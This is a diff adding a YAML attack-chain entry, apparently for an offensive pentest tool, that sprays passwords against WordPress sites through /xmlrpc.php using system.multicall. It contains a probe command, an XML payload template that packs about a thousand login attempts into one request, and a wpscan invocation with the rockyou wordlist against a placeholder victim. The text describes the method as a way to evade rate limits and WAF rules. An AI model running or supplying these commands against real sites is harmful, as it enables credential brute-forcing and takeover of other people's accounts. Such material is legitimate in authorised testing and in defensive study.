@@ -1,0 +1,49 @@
+chain_id: wordpress_xmlrpc_brute
+title: "WordPress — /xmlrpc.php system.multicall password spray"
+severity: HIGH
+tags: [web, wordpress, xmlrpc, brute-force]
+
+trigger:
+  any_of:
+    - { path_in: ["/xmlrpc.php"] }
+
+description: |
+  WordPress XML-RPC supports system.multicall which lets you bundle up
+  to ~1000 wp.getUsersBlogs login attempts in a single HTTP request.
+  The result: Hydra-grade brute force speed even when /wp-login.php is
+  rate-limited or behind WAF rules.
+
+steps:
+  - id: 1
+    title: "Confirm xmlrpc.php is enabled"
+    command: |
+      curl -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
+        http://$VICTIMA/xmlrpc.php
+
+  - id: 2
+    title: "Single-request multicall payload (1000 passwords per HTTP request)"
+    command: |
+      cat > multicall.xml << 'EOF'
+      <?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>
+      <params><param><value><array><data>
+        <value><struct>
+          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+          <member><name>params</name><value><array><data>
+            <value><array><data><value><string>USUARIO</string></value><value><string>PASS1</string></value></data></array></value>
+          </data></array></value></member>
+        </struct></value>
+        <!-- repeat 999 more <value><struct>...</struct></value> entries -->
+      </data></array></value></param></params>
+      </methodCall>
+      EOF
+      curl -X POST -H 'Content-Type: text/xml' --data @multicall.xml http://$VICTIMA/xmlrpc.php
+
+  - id: 3
+    title: "Or with wpscan (which scripts the multicall flow)"
+    command: |
+      wpscan --url http://$VICTIMA --usernames USUARIO \
+        --passwords /usr/share/wordlists/rockyou.txt --threads 50 \
+        --max-threads 50 --request-timeout 30
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
